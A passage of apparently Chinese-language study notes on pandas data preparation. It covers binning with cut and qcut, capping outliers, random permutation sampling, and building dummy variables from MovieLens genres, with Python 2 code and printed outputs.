<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">group_names =  [<span class="string">'Youth'</span>, <span class="string">'YoungAdult'</span>, <span class="string">'MiddleAged'</span>, <span class="string">'Senior'</span>]</span><br><span class="line">cuts1 = pd.cut(ages, bins, labels = group_names)</span><br><span class="line"><span class="keyword">print</span> cuts1</span><br><span class="line"><span class="comment">#labels属性没有变化</span></span><br><span class="line"><span class="keyword">print</span> cuts1.labels</span><br><span class="line"><span class="comment">#levels属性变成标签</span></span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> cuts1.levels</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[Youth, Youth, Youth, YoungAdult, Youth, ..., YoungAdult, Senior, MiddleAged, MiddleAged, YoungAdult]</span><br><span class="line">Length: 12</span><br><span class="line">Categories (4, object): [Youth &lt; YoungAdult &lt; MiddleAged &lt; Senior]</span><br><span class="line">[0 0 0 1 0 0 2 1 3 2 2 1]</span><br></pre></td></tr></table></figure>
<p>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Index([u&apos;Youth&apos;, u&apos;YoungAdult&apos;, u&apos;MiddleAged&apos;, u&apos;Senior&apos;], dtype=&apos;object&apos;)</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>如果cut中传入的是面元数量而不是确切的面元边界</p>
<ol>
<li><p>会根据数据的最小值和最大值计算等长面元</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data = np.random.rand(<span class="number">20</span>)</span><br><span class="line"><span class="comment"># 4 为要分的分数</span></span><br><span class="line"><span class="comment"># precision 为小数精度</span></span><br><span class="line"><span class="keyword">print</span> pd.cut(data,<span class="number">4</span>, precision = <span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[(0.299, 0.526], (0.299, 0.526], (0.299, 0.526], (0.752, 0.979], (0.072, 0.299], ..., (0.072, 0.299], (0.072, 0.299], (0.526, 0.752], (0.299, 0.526], (0.072, 0.299]]</span><br><span class="line">Length: 20</span><br><span class="line">Categories (4, object): [(0.072, 0.299] &lt; (0.299, 0.526] &lt; (0.526, 0.752] &lt; (0.752, 0.979]]</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
</li>
<li><p>qcut类似于cut函数，可以根据样本分位数来划分</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data = np.random.randn(<span class="number">1000</span>) <span class="comment"># 正态分布</span></span><br><span class="line">cats = pd.qcut(data,<span class="number">4</span>) <span class="comment"># 不是区间等分，而是数量等分</span></span><br><span class="line"><span class="keyword">print</span> cats.levels</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> pd.value_counts(cats)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Index([u&apos;[-3.152, -0.722]&apos;, u&apos;(-0.722, -0.00102]&apos;, u&apos;(-0.00102, 0.646]&apos;,</span><br><span class="line">       u&apos;(0.646, 3.58]&apos;],</span><br><span class="line">      dtype=&apos;object&apos;)</span><br></pre></td></tr></table></figure>
<p>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(0.646, 3.58]         250</span><br><span class="line">(-0.00102, 0.646]     250</span><br><span class="line">(-0.722, -0.00102]    250</span><br><span class="line">[-3.152, -0.722]      250</span><br><span class="line">dtype: int64</span><br></pre></td></tr></table></figure>
<ol>
<li><p>qcut可以设置自定义的分位数(0到1之间的数值,包含端点),数量等分</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cuts1 = pd.qcut(data, [<span class="number">0</span>, <span class="number">0.1</span>, <span class="number">0.5</span>, <span class="number">0.9</span>, <span class="number">1.0</span>])</span><br><span class="line"><span class="keyword">print</span> cuts1</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> pd.value_counts(cuts1)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[(-0.00102, 1.169], (1.169, 3.58], (-0.00102, 1.169], (-0.00102, 1.169], (-0.00102, 1.169], ..., (-1.275, -0.00102], (-1.275, -0.00102], (-1.275, -0.00102], (-1.275, -0.00102], (-0.00102, 1.169]]</span><br><span class="line">Length: 1000</span><br><span class="line">Categories (4, object): [[-3.152, -1.275] &lt; (-1.275, -0.00102] &lt; (-0.00102, 1.169] &lt; (1.169, 3.58]]</span><br></pre></td></tr></table></figure>
<p>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(-0.00102, 1.169]     400</span><br><span class="line">(-1.275, -0.00102]    400</span><br><span class="line">(1.169, 3.58]         100</span><br><span class="line">[-3.152, -1.275]      100</span><br><span class="line">dtype: int64</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
<h2 id="检测和过滤异常值"><a href="#检测和过滤异常值" class="headerlink" title="检测和过滤异常值"></a>检测和过滤异常值</h2><h3 id="异常值-outlier-的过滤或换算基本就是数组运算"><a href="#异常值-outlier-的过滤或换算基本就是数组运算" class="headerlink" title="异常值(outlier)的过滤或换算基本就是数组运算"></a>异常值(outlier)的过滤或换算基本就是数组运算</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">np.random.seed(<span class="number">12345</span>)</span><br><span class="line">data = pd.DataFrame(np.random.randn(<span class="number">1000</span>, <span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> data.describe() <span class="comment"># 查看基本描述</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#找出某列中绝对值大小超过3的值</span></span><br><span class="line"></span><br><span class="line">col = data[<span class="number">3</span>]</span><br><span class="line"><span class="keyword">print</span> col[np.abs(col) &gt; <span class="number">3</span>]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#找出含有"超过3或者-3的值"的行，用any方法</span></span><br><span class="line"><span class="keyword">print</span> data[np.abs(data) &gt; <span class="number">3</span>]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> data[(np.abs(data) &gt; <span class="number">3</span>).any(<span class="number">1</span>)]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">                 0            1            2            3</span><br><span class="line">count  1000.000000  1000.000000  1000.000000  1000.000000</span><br><span class="line">mean     -0.067684     0.067924     0.025598    -0.002298</span><br><span class="line">std       0.998035     0.992106     1.006835     0.996794</span><br><span class="line">min      -3.428254    -3.548824    -3.184377    -3.745356</span><br><span class="line">25%      -0.774890    -0.591841    -0.641675    -0.644144</span><br><span class="line">50%      -0.116401     0.101143     0.002073    -0.013611</span><br><span class="line">75%       0.616366     0.780282     0.680391     0.654328</span><br><span class="line">max       3.366626     2.653656     3.260383     3.927528</span><br><span class="line">97     3.927528</span><br><span class="line">305   -3.399312</span><br><span class="line">400   -3.745356</span><br><span class="line">Name: 3, dtype: float64</span><br><span class="line"></span><br><span class="line">      0   1         2   3</span><br><span class="line">0   NaN NaN       NaN NaN</span><br><span class="line">1   NaN NaN       NaN NaN</span><br><span class="line">2   NaN NaN       NaN NaN</span><br><span class="line">3   NaN NaN       NaN NaN</span><br><span class="line">4   NaN NaN       NaN NaN</span><br><span class="line">5   NaN NaN  3.248944 NaN</span><br><span class="line">6   NaN NaN       NaN NaN</span><br><span class="line">7   NaN NaN       NaN NaN</span><br><span class="line">8   NaN NaN       NaN NaN</span><br><span class="line">9   NaN NaN       NaN NaN</span><br><span class="line">10  NaN NaN       NaN NaN</span><br><span class="line">11  NaN NaN       NaN NaN</span><br><span class="line">12  NaN NaN       NaN NaN</span><br><span class="line">13  NaN NaN       NaN NaN</span><br><span class="line">14  NaN NaN       NaN NaN</span><br><span class="line">15  NaN NaN       NaN NaN</span><br><span class="line">16  NaN NaN       NaN NaN</span><br><span class="line">17  NaN NaN       NaN NaN</span><br><span class="line">18  NaN NaN       NaN NaN</span><br><span class="line">19  NaN NaN       NaN NaN</span><br><span class="line">20  NaN NaN       NaN NaN</span><br><span class="line">21  NaN NaN       NaN NaN</span><br><span class="line">22  NaN NaN       NaN NaN</span><br><span class="line">23  NaN NaN       NaN NaN</span><br><span class="line">24  NaN NaN       NaN NaN</span><br><span class="line">25  NaN NaN       NaN NaN</span><br><span class="line">26  NaN NaN       NaN NaN</span><br><span class="line">27  NaN NaN       NaN NaN</span><br><span class="line">28  NaN NaN       NaN NaN</span><br><span class="line">29  NaN NaN       NaN NaN</span><br><span class="line">..   ..  ..       ...  ..</span><br><span class="line">970 NaN NaN       NaN NaN</span><br><span class="line">971 NaN NaN       NaN NaN</span><br><span class="line">972 NaN NaN       NaN NaN</span><br><span class="line">973 NaN NaN       NaN NaN</span><br><span class="line">974 NaN NaN       NaN NaN</span><br><span class="line">975 NaN NaN       NaN NaN</span><br><span class="line">976 NaN NaN       NaN NaN</span><br><span class="line">977 NaN NaN       NaN NaN</span><br><span class="line">978 NaN NaN       NaN NaN</span><br><span class="line">979 NaN NaN       NaN NaN</span><br><span class="line">980 NaN NaN       NaN NaN</span><br><span class="line">981 NaN NaN       NaN NaN</span><br><span class="line">982 NaN NaN       NaN NaN</span><br><span class="line">983 NaN NaN       NaN NaN</span><br><span class="line">984 NaN NaN       NaN NaN</span><br><span class="line">985 NaN NaN       NaN NaN</span><br><span class="line">986 NaN NaN       NaN NaN</span><br><span class="line">987 NaN NaN       NaN NaN</span><br><span class="line">988 NaN NaN       NaN NaN</span><br><span class="line">989 NaN NaN       NaN NaN</span><br><span class="line">990 NaN NaN       NaN NaN</span><br><span class="line">991 NaN NaN       NaN NaN</span><br><span class="line">992 NaN NaN       NaN NaN</span><br><span class="line">993 NaN NaN       NaN NaN</span><br><span class="line">994 NaN NaN       NaN NaN</span><br><span class="line">995 NaN NaN       NaN NaN</span><br><span class="line">996 NaN NaN       NaN NaN</span><br><span class="line">997 NaN NaN       NaN NaN</span><br><span class="line">998 NaN NaN       NaN NaN</span><br><span class="line">999 NaN NaN       NaN NaN</span><br><span class="line"></span><br><span class="line">[1000 rows x 4 columns]</span><br><span class="line"></span><br><span class="line">            0         1         2         3</span><br><span class="line">5   -0.539741  0.476985  3.248944 -1.021228</span><br><span class="line">97  -0.774363  0.552936  0.106061  3.927528</span><br><span class="line">102 -0.655054 -0.565230  3.176873  0.959533</span><br><span class="line">305 -2.315555  0.457246 -0.025907 -3.399312</span><br><span class="line">324  0.050188  1.951312  3.260383  0.963301</span><br><span class="line">400  0.146326  0.508391 -0.196713 -3.745356</span><br><span class="line">499 -0.293333 -0.242459 -3.056990  1.918403</span><br><span class="line">523 -3.428254 -0.296336 -0.439938 -0.867165</span><br><span class="line">586  0.275144  1.179227 -3.184377  1.369891</span><br><span class="line">808 -0.362528 -3.548824  1.553205 -2.186301</span><br><span class="line">900  3.366626 -2.372214  0.851010  1.332846</span><br></pre></td></tr></table></figure>
<ol>
<li><p>利用这些条件来限制值在区间内(np.sign返回符号(-1,0,1))</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data[np.abs(data) &gt; <span class="number">3</span>] = np.sign(data) * <span class="number">3</span></span><br><span class="line"><span class="keyword">print</span> data.describe()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">                 0            1            2            3</span><br><span class="line">count  1000.000000  1000.000000  1000.000000  1000.000000</span><br><span class="line">mean     -0.067623     0.068473     0.025153    -0.002081</span><br><span class="line">std       0.995485     0.990253     1.003977     0.989736</span><br><span class="line">min      -3.000000    -3.000000    -3.000000    -3.000000</span><br><span class="line">25%      -0.774890    -0.591841    -0.641675    -0.644144</span><br><span class="line">50%      -0.116401     0.101143     0.002073    -0.013611</span><br><span class="line">75%       0.616366     0.780282     0.680391     0.654328</span><br><span class="line">max       3.000000     2.653656     3.000000     3.000000</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="排列和随机采样"><a href="#排列和随机采样" class="headerlink" title="排列和随机采样"></a>排列和随机采样</h2><h3 id="numpy-random-permutation函数可以实现对Series或者DF的列的排序工作"><a href="#numpy-random-permutation函数可以实现对Series或者DF的列的排序工作" class="headerlink" title="numpy.random.permutation函数可以实现对Series或者DF的列的排序工作"></a>numpy.random.permutation函数可以实现对Series或者DF的列的排序工作</h3><ol>
<li><p>通过需要排列的轴长度调用permutation，产生一个新顺序的整数数组</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">df = pd.DataFrame(np.arange( <span class="number">5</span> * <span class="number">4</span>).reshape(<span class="number">5</span>, <span class="number">4</span>))</span><br><span class="line">sampler = np.random.permutation(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">print</span> sampler</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1 3 0 2 4]</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后通过ix索引操作或者take函数中使用该数组</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> df</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> df.take(sampler)</span><br><span class="line"><span class="keyword">print</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    0   1   2   3</span><br><span class="line">0   0   1   2   3</span><br><span class="line">1   4   5   6   7</span><br><span class="line">2   8   9  10  11</span><br><span class="line">3  12  13  14  15</span><br><span class="line">4  16  17  18  19</span><br><span class="line"></span><br><span class="line">    0   1   2   3</span><br><span class="line">1   4   5   6   7</span><br><span class="line">3  12  13  14  15</span><br><span class="line">0   0   1   2   3</span><br><span class="line">2   8   9  10  11</span><br><span class="line">4  16  17  18  19</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过permutation来随机选取子集</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> df.take(np.random.permutation(len(df))[:<span class="number">3</span>])</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    0   1   2   3</span><br><span class="line">1   4   5   6   7</span><br><span class="line">0   0   1   2   3</span><br><span class="line">4  16  17  18  19</span><br></pre></td></tr></table></figure>
<ol>
<li><p>替换方式来产生样本 np.random.randint</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bag = np.array([<span class="number">5</span>,<span class="number">7</span>,<span class="number">-1</span>,<span class="number">6</span>,<span class="number">5</span>])</span><br><span class="line">sampler = np.random.randint(<span class="number">0</span>, len(bag), size = <span class="number">10</span>)</span><br><span class="line"><span class="keyword">print</span> sampler</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line">draws = bag.take(sampler)</span><br><span class="line"><span class="keyword">print</span> draws</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[3 0 4 1 1 2 3 0 1 2]</span><br></pre></td></tr></table></figure>
<p>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ 6  5  5  7  7 -1  6  5  7 -1]</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
<h2 id="计算指标-哑变量"><a href="#计算指标-哑变量" class="headerlink" title="计算指标/哑变量"></a>计算指标/哑变量</h2><h3 id="常用于统计建模或机器学习的转换方式"><a href="#常用于统计建模或机器学习的转换方式" class="headerlink" title="常用于统计建模或机器学习的转换方式"></a>常用于统计建模或机器学习的转换方式</h3><h3 id="将-分类标量-转换成-哑变量矩阵-或-指标矩阵"><a href="#将-分类标量-转换成-哑变量矩阵-或-指标矩阵" class="headerlink" title="将 分类标量 转换成 哑变量矩阵 或 指标矩阵"></a>将 分类标量 转换成 哑变量矩阵 或 指标矩阵</h3><ol>
<li><p>如果DF某一列含有K个不同的值，则可以派生出一个</p>
</li>
<li><p>pandas中 get~dummies函数可以实现该功能~</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">df = pd.DataFrame(&#123;<span class="string">'key'</span>: list(<span class="string">'bbacab'</span>),</span><br><span class="line">                   <span class="string">'data1'</span>: range(<span class="number">3</span>,<span class="number">9</span>)&#125;)</span><br><span class="line"><span class="keyword">print</span> df</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> pd.get_dummies(df[<span class="string">'key'</span>])</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   data1 key</span><br><span class="line">0      3   b</span><br><span class="line">1      4   b</span><br><span class="line">2      5   a</span><br><span class="line">3      6   c</span><br><span class="line">4      7   a</span><br><span class="line">5      8   b</span><br><span class="line"></span><br><span class="line">     a    b    c</span><br><span class="line">0  0.0  1.0  0.0</span><br><span class="line">1  0.0  1.0  0.0</span><br><span class="line">2  1.0  0.0  0.0</span><br><span class="line">3  0.0  0.0  1.0</span><br><span class="line">4  1.0  0.0  0.0</span><br><span class="line">5  0.0  1.0  0.0</span><br></pre></td></tr></table></figure>
</li>
<li><p>给指标DF的列一个前缀，以便能够跟其他数据进行合并 prefix参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dummies = pd.get_dummies(df[<span class="string">'key'</span>], prefix = <span class="string">'key'</span>)</span><br><span class="line"><span class="keyword">print</span> dummies</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="comment"># 将 df的 data1列与 dummies合并，就是左右合并，dummies的列为前缀_[a, b,c...]</span></span><br><span class="line">df_with_dummy = df[[<span class="string">'data1'</span>]].join(dummies)</span><br><span class="line"><span class="keyword">print</span> df_with_dummy</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   key_a  key_b  key_c</span><br><span class="line">0    0.0    1.0    0.0</span><br><span class="line">1    0.0    1.0    0.0</span><br><span class="line">2    1.0    0.0    0.0</span><br><span class="line">3    0.0    0.0    1.0</span><br><span class="line">4    1.0    0.0    0.0</span><br><span class="line">5    0.0    1.0    0.0</span><br><span class="line"></span><br><span class="line">   data1  key_a  key_b  key_c</span><br><span class="line">0      3    0.0    1.0    0.0</span><br><span class="line">1      4    0.0    1.0    0.0</span><br><span class="line">2      5    1.0    0.0    0.0</span><br><span class="line">3      6    0.0    0.0    1.0</span><br><span class="line">4      7    1.0    0.0    0.0</span><br><span class="line">5      8    0.0    1.0    0.0</span><br></pre></td></tr></table></figure>
</li>
<li><p>对于某行同属于多个分类的处理 <span class="tag" tag-name="没明白"><span class="smallcaps">没明白</span>&lt;/span&gt;</span></p>
<ol>
<li><p>读取数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mnames = [<span class="string">'movie_id'</span>, <span class="string">'title'</span>, <span class="string">'genres'</span>]</span><br><span class="line">movies = pd.read_table(<span class="string">'pydata-book-master\ch02\movielens\movies.dat'</span>,</span><br><span class="line">                       sep = <span class="string">'::'</span>, header = <span class="literal">None</span>, names = mnames)</span><br><span class="line"><span class="keyword">print</span> movies[:<span class="number">10</span>]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">   movie_id                               title                        genres</span><br><span class="line">0         1                    Toy Story (1995)   Animation|Children&apos;s|Comedy</span><br><span class="line">1         2                      Jumanji (1995)  Adventure|Children&apos;s|Fantasy</span><br><span class="line">2         3             Grumpier Old Men (1995)                Comedy|Romance</span><br><span class="line">3         4            Waiting to Exhale (1995)                  Comedy|Drama</span><br><span class="line">4         5  Father of the Bride Part II (1995)                        Comedy</span><br><span class="line">5         6                         Heat (1995)         Action|Crime|Thriller</span><br><span class="line">6         7                      Sabrina (1995)                Comedy|Romance</span><br><span class="line">7         8                 Tom and Huck (1995)          Adventure|Children&apos;s</span><br><span class="line">8         9                 Sudden Death (1995)                        Action</span><br><span class="line">9        10                    GoldenEye (1995)     Action|Adventure|Thriller</span><br></pre></td></tr></table></figure>
</li>
<li><p>给每个genre添加指标变量</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 从数据集中抽取出不同的genre值(注意巧用set.union)</span></span><br><span class="line">genre_iter = (set(x.split(<span class="string">'|'</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> movies.genres)</span><br><span class="line">genres = sorted(set.union(*genre_iter))</span><br><span class="line"></span><br><span class="line"><span class="comment">#从一个全零DF开始构建指标DF</span></span><br><span class="line">dummies = pd.DataFrame(np.zeros((len(movies), len(genres))),</span><br><span class="line">                       columns = genres)</span><br><span class="line"></span><br><span class="line"><span class="comment">#接下来，迭代每部电影并将dummies各行的项设置为1</span></span><br><span class="line"><span class="keyword">for</span> i, gen <span class="keyword">in</span> enumerate(movies.genres):</span><br><span class="line">    dummies.ix[i, gen.split(<span class="string">'|'</span>)] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后，在将其与movies合并起来</span></span><br><span class="line">movies_windic = movies.join(dummies.add_prefix(<span class="string">'Genre_'</span>))</span><br><span class="line"><span class="keyword">print</span> movies_windic.ix[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">movie_id                                       1</span><br><span class="line">title                           Toy Story (1995)</span><br><span class="line">genres               Animation|Children&apos;s|Comedy</span><br><span class="line">Genre_Action                                   0</span><br><span class="line">Genre_Adventure                                0</span><br><span class="line">Genre_Animation                                1</span><br><span class="line">Genre_Children&apos;s                               1</span><br><span class="line">Genre_Comedy                                   1</span><br><span class="line">Genre_Crime                                    0</span><br><span class="line">Genre_Documentary                              0</span><br><span class="line">Genre_Drama                                    0</span><br><span class="line">Genre_Fantasy                                  0</span><br><span class="line">Genre_Film-Noir                                0</span><br><span class="line">Genre_Horror                                   0</span><br><span class="line">Genre_Musical                                  0</span><br><span class="line">Genre_Mystery                                  0</span><br><span class="line">Genre_Romance                                  0</span><br><span class="line">Genre_Sci-Fi                                   0</span><br><span class="line">Genre_Thriller                                 0</span><br><span class="line">Genre_War                                      0</span><br><span class="line">Genre_Western                                  0</span><br><span class="line">Name: 0, dtype: object</span><br></pre></td></tr></table></figure>
</li>
<li><p>对统计应用有用的秘诀是</p>
<ol>
<li><p>结合get~dummies~ 和诸如cut之类的离散化函数</p>
